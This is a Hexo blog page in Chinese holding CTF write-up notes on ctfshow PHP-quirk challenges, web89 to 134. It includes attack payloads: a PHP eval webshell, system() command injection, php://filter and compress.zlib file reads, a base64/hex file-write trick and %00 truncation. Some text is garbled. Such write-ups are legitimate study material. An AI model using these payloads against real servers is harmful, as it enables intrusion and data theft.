@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="php 特性web89 利用preg_match不能匹配数组题目  分析：利用intval() 的返回值是整型，1或者0。 作用于数组时当数组为空，返回值是0，不为空则为1，并无报错 解法 1?num[]&#x3D;1  90 直接传入一个小数91题目  ^：匹配字符串开始的位置$：匹配字符串结束的位置&#x2F;i：表示匹配的时候不区分大小写&#x2F;m：表示多行匹配，使边界字符 ^ 和 $ 匹配每一行的开头和结尾 解法：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php特性">
+<meta property="og:url" content="http://example.com/2022/03/12/php%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="php 特性web89 利用preg_match不能匹配数组题目  分析：利用intval() 的返回值是整型，1或者0。 作用于数组时当数组为空，返回值是0，不为空则为1，并无报错 解法 1?num[]&#x3D;1  90 直接传入一个小数91题目  ^：匹配字符串开始的位置$：匹配字符串结束的位置&#x2F;i：表示匹配的时候不区分大小写&#x2F;m：表示多行匹配，使边界字符 ^ 和 $ 匹配每一行的开头和结尾 解法：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312141119968.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312144321316.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312161907776.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312162710211.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312165628366.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312170637113.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220312171006663.png">
+<meta property="og:image" content="d:/boke/source_posts/php特性/image-20220313134202958.png">
+<meta property="og:image" content="http://example.com/2022/03/12/php%E7%89%B9%E6%80%A7/image-20220319151455866.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407232947568.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408000844235.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408132647607.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408142926030.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408143858001.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224133391.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224330615.png">
+<meta property="og:image" content="c:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224431108.png">
+<meta property="article:published_time" content="2022-03-12T06:10:57.000Z">
+<meta property="article:modified_time" content="2022-04-08T16:26:39.905Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/boke/source_posts/php特性/image-20220312141119968.png">
+
+<link rel="canonical" href="http://example.com/2022/03/12/php%E7%89%B9%E6%80%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>php特性 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/php%E7%89%B9%E6%80%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php特性
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-12 14:10:57" itemprop="dateCreated datePublished" datetime="2022-03-12T14:10:57+08:00">2022-03-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-09 00:26:39" itemprop="dateModified" datetime="2022-04-09T00:26:39+08:00">2022-04-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="php-特性"><a href="#php-特性" class="headerlink" title="php 特性"></a>php 特性</h2><h3 id="web89-利用preg-match不能匹配数组"><a href="#web89-利用preg-match不能匹配数组" class="headerlink" title="web89 利用preg_match不能匹配数组"></a>web89 利用preg_match不能匹配数组</h3><p>题目</p>
+<p><img src="D:\boke\source_posts\php特性\image-20220312141119968.png" alt="image-20220312141119968"></p>
+<p>分析：利用intval() 的返回值是整型，1或者0。 作用于数组时当数组为空，返回值是0，不为空则为1，并无报错</p>
+<p>解法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="90-直接传入一个小数"><a href="#90-直接传入一个小数" class="headerlink" title="90 直接传入一个小数"></a>90 直接传入一个小数</h3><h3 id="91"><a href="#91" class="headerlink" title="91"></a>91</h3><p>题目</p>
+<p><img src="D:\boke\source_posts\php特性\image-20220312144321316.png" alt="image-20220312144321316"></p>
+<p>^：匹配字符串开始的位置<br>$：匹配字符串结束的位置<br>/i：表示匹配的时候不区分大小写<br>/m：表示多行匹配，使边界字符 ^ 和 $ 匹配每一行的开头和结尾</p>
+<p>解法：</p>
+<h4 id="92-93-都可以直接利用小数来接"><a href="#92-93-都可以直接利用小数来接" class="headerlink" title="92 93 都可以直接利用小数来接"></a>92 93 都可以直接利用小数来接</h4><p>题目</p>
+<p><img src="D:\boke\source_posts\php特性\image-20220312161907776.png" alt="image-20220312161907776"></p>
+<p>直接构造num=4377.1</p>
+<h3 id="94-多了strpos（）函数"><a href="#94-多了strpos（）函数" class="headerlink" title="94 多了strpos（）函数"></a>94 多了strpos（）函数</h3><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strpos(string,find,start)  也就是在A里面找B</span><br><span class="line">string 必选  要查找的字符串相当于A</span><br><span class="line">find    必选   相当于 bB</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\boke\source_posts\php特性\image-20220312162710211.png" alt="image-20220312162710211"></p>
+<h4 id="96"><a href="#96" class="headerlink" title="96"></a>96</h4><p><img src="D:\boke\source_posts\php特性\image-20220312165628366.png" alt="image-20220312165628366"></p>
+<p>解法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?/u=/var/www/html/flag.php</span><br><span class="line">或者利用协议</span><br><span class="line">u=php://filter/resource=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="97php-代码审计"><a href="#97php-代码审计" class="headerlink" title="97php 代码审计"></a>97php 代码审计</h4><p><img src="D:\boke\source_posts\php特性\image-20220312170637113.png" alt="image-20220312170637113"></p>
+<p>解法</p>
+<p><img src="D:\boke\source_posts\php特性\image-20220312171006663.png" alt="image-20220312171006663"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">其他解法</span><br><span class="line"></span><br><span class="line">构造0e开头的                   因为 0的多少次方都是0</span><br><span class="line">利用MD5和shal无法加密数组  </span><br></pre></td></tr></table></figure>
+
+<h3 id="web99利用了in-arry函数"><a href="#web99利用了in-arry函数" class="headerlink" title="web99利用了in_arry函数"></a>web99利用了in_arry函数</h3><h4 id="补充函数知识"><a href="#补充函数知识" class="headerlink" title="补充函数知识"></a>补充函数知识</h4><p>in_arry           in_array延用了php中的==</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在数组中搜索值 &quot;Glenn&quot; ，并输出一些文本：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$people = array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配已找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配未找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>file_put_contents()</p>
+<p>file_put_contents() 函数把一个字符串写入文件中。</p>
+<p>array_push</p>
+<p>将数值追加到数组后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">产生随机数</span><br><span class="line">rand(min,max)</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\boke\source_posts\php特性\image-20220313134202958.png" alt="image-20220313134202958"></p>
+<img src="/2022/03/12/php%E7%89%B9%E6%80%A7/image-20220319151455866.png" class="" title="image-20220319151455866">
+
+<p>playload:get传参数1.php</p>
+<p>​                post 传参 contents=<?php eval($_POST[2]);?></p>
+<p>然后直接访问1.php</p>
+<h3 id="100-考察反射类-和and和-amp-amp-的区别"><a href="#100-考察反射类-和and和-amp-amp-的区别" class="headerlink" title="100 考察反射类 和and和&amp;&amp;的区别"></a>100 考察反射类 和and和&amp;&amp;的区别</h3><p>考察点：and与&amp;&amp;的区别+反射类ReflectionClass的使用</p>
+<p><strong>and是位与，就是把ab中每一位进行与运算，&amp;&amp;是布尔量相与，C++中任何非0量都是false</strong></p>
+<p>第一部分<br>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=true and false and false;</span><br><span class="line">var_dump($a);  返回true</span><br><span class="line"></span><br><span class="line">$a=true &amp;&amp; false &amp;&amp; false;</span><br><span class="line">var_dump($a);  返回false</span><br></pre></td></tr></table></figure>
+
+
+<p>所以只要保证v1是数字就可以使得v0为true，从而进入if中。</p>
+<p>playload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br><span class="line">v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/</span><br><span class="line">v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;</span><br><span class="line">v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;);</span><br><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>
+
+<h3 id="101-过滤了很多直接"><a href="#101-过滤了很多直接" class="headerlink" title="101 过滤了很多直接"></a>101 过滤了很多直接</h3><p>直接用 v2=echo new reflectionclass</p>
+<h3 id="102-考察hex2bin函数的使用-以及回调函数"><a href="#102-考察hex2bin函数的使用-以及回调函数" class="headerlink" title="102 考察hex2bin函数的使用 以及回调函数"></a>102 考察hex2bin函数的使用 以及回调函数</h3><p>call_user_func($v1,$s)，将v1作为函数来处理$s.</p>
+<p>hex2bin把十六进制值转换为 ASCII 字符：（不能带有0x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(&quot;48656c6c6f20576f726c6421&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">输出</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>
+
+<p>思路：通过写入的v 2 全 为 数 字 ， 转 化 为 字 符 v2全为数字，转化为字符v2全为数字，转化为字符str，然后写入文件，然后访问文件得到所需</p>
+<p>使用base64编码为字符，然后转化为全为数字的16进制得到$v3</p>
+<p>关键就是什么代码base64编码后再转为十六进制为全数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>输出   5044383959474e6864434171594473<br>带e的话会被认为是科学计数法，可以通过is_numeric检测。（<strong>php7不行</strong>）<br>v2=5044383959474e6864434171594473</p>
+<p>payload:</p>
+<p>v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</p>
+<h3 id="104-105-sha1函数碰撞-无法处理数组"><a href="#104-105-sha1函数碰撞-无法处理数组" class="headerlink" title="104-105 sha1函数碰撞-无法处理数组"></a>104-105 sha1函数碰撞-无法处理数组</h3><p><strong>sha1处理数组，会返回false，而这个又是罗类型比较</strong></p>
+<p><strong>或者与md5一样，可利用0e科学计数法达到伪相等</strong></p>
+<h4 id="106-foreach函数-变量覆盖"><a href="#106-foreach函数-变量覆盖" class="headerlink" title="106 foreach函数    变量覆盖"></a>106 foreach函数    变量覆盖</h4><p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407232947568.png" alt="image-20220407232947568"></p>
+<h4 id="107parse-str函数绕过"><a href="#107parse-str函数绕过" class="headerlink" title="107parse_str函数绕过"></a>107<strong>parse_str</strong>函数绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;q=123&amp;p=456&#x27;;</span><br><span class="line">parse_str($a,$b);</span><br><span class="line">echo $b[&#x27;q&#x27;];   //输出123</span><br><span class="line">echo $b[&#x27;p&#x27;];   //输出456</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408000844235.png" alt="image-20220408000844235"></p>
+<h4 id="108-ereg函数绕过-存在-00截断漏洞"><a href="#108-ereg函数绕过-存在-00截断漏洞" class="headerlink" title="108 ereg函数绕过       存在%00截断漏洞"></a>108 ereg函数绕过       存在%00截断漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//只有36d的人才能看到flag</span><br><span class="line">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
+<p>php中ereg函数的截断漏洞</p>
+<p>strrev函数：反转字符串</p>
+<p>0x36d=877，因为会被反转所以需要778来提前反转，同时需要截断处理，所以c=a%00778经过反转后取整就是877</p>
+<h4 id="109-对类的绕过-利用类的异常处理"><a href="#109-对类的绕过-利用类的异常处理" class="headerlink" title="109 对类的绕过   利用类的异常处理"></a>109 对类的绕过   利用类的异常处理</h4><p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408132647607.png" alt="image-20220408132647607"></p>
+<p>先来看下这个正则表达式/[a-zA-Z]+/ 匹配至少有一个字母的字符串</p>
+<p>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。</p>
+<p>Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类</p>
+<p>ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射</p>
+<p>?v1=Exception&amp;v2=system(‘tac fl36dg.txt’)<br>或者<br>?v1=ReflectionClass&amp;v2=system(‘tac fl36dg.txt’)<br>或者<br>?v1=ReflectionMethod&amp;v2=system(‘tac fl36dg.txt’)<br>————————————————</p>
+<h3 id="110-对类的绕过-filesystemiterator"><a href="#110-对类的绕过-filesystemiterator" class="headerlink" title="110  对类的绕过 filesystemiterator"></a>110  对类的绕过 filesystemiterator</h3><p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408142926030.png" alt="image-20220408142926030"></p>
+<p>FilesystemIterator获取目录文件FilesystemIterator</p>
+<p>getcwd()函数取得当前工作目录getcwd()函数</p>
+<p>构造playload：</p>
+<p>v1=FilesystemIterator&amp;v2=getcwd</p>
+<p>得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷：只能获取第一个文件名字<br>————————————————</p>
+<h3 id="111-简单变量覆盖-用globals全局变量来输出"><a href="#111-简单变量覆盖-用globals全局变量来输出" class="headerlink" title="111 简单变量覆盖 用globals全局变量来输出"></a>111 简单变量覆盖 用globals全局变量来输出</h3><p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220408143858001.png" alt="image-20220408143858001"></p>
+<p>利用全局变量来实现输出</p>
+<p>v1=ctfshow</p>
+<p>v2=GLOBALS</p>
+<p>KaTeX parse error: Expected ‘EOF’, got ‘&amp;’ at position 9: ctfshow=&amp;̲GLOBALS此时c t f s h o w 的 指 向 就 是 全 局 变 量 的 指 向 ， 于 其 具 有 了 相 同 的 作 用 ， 那 么 此 时 v a r d u m p ( ctfshow的指向就是全局变量的指向，于其具有了相同的作用，那么此时var_dump(ctfshow的指向就是全局变量的指向，于其具有了相同的作用，那么此时var<br>dump(ctfshow)就是var_dump($GLOBALS)</p>
+<h3 id="112-is-file函数绕过-常用的编码伪协议读取"><a href="#112-is-file函数绕过-常用的编码伪协议读取" class="headerlink" title="==112==     is_file函数绕过 常用的编码伪协议读取"></a>==112==     is_file函数绕过 常用的编码伪协议读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">可以直接用不带任何过滤器的filter伪协议</span><br><span class="line">file=php://filter/resource=flag.php</span><br><span class="line">也可以用一些没有过滤掉的编码方式和转换方式</span><br><span class="line">file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">file=compress.zlib://flag.php</span><br><span class="line">↑这是读取压缩流</span><br><span class="line">file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">↑这是两位一反转的读取方式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="113-is-file函数绕过"><a href="#113-is-file函数绕过" class="headerlink" title="113 is_file函数绕过"></a>113 is_file函数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+
+<p>利用上一道题目的payload可以继续打</p>
+<p>file=compress.zlib://flag.php</p>
+<p>linux里/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容<br>多次重复后绕过is_file。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="134-SERVER-‘QUERY-STRING’-解释-学习"><a href="#134-SERVER-‘QUERY-STRING’-解释-学习" class="headerlink" title="134[$_SERVER[‘QUERY_STRING’]解释]学习"></a>134[$_SERVER[‘QUERY_STRING’]解释]学习</h3><p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224133391.png" alt="image-20220407224133391"></p>
+<p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224330615.png" alt="image-20220407224330615"></p>
+<p><img src="C:/Users/victory/AppData/Roaming/Typora/draftsRecover/php特性/image-20220407224431108.png" alt="image-20220407224431108"></p>
+<p><strong>extract() 函数从数组中将变量导入到当前的符号表。</strong></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/JasonAPoint/article/deta">https://blog.csdn.net/JasonAPoint/article/deta</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="文件包含">
+      <i class="fa fa-chevron-left"></i> 文件包含
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/14/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
+      SQL注入 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
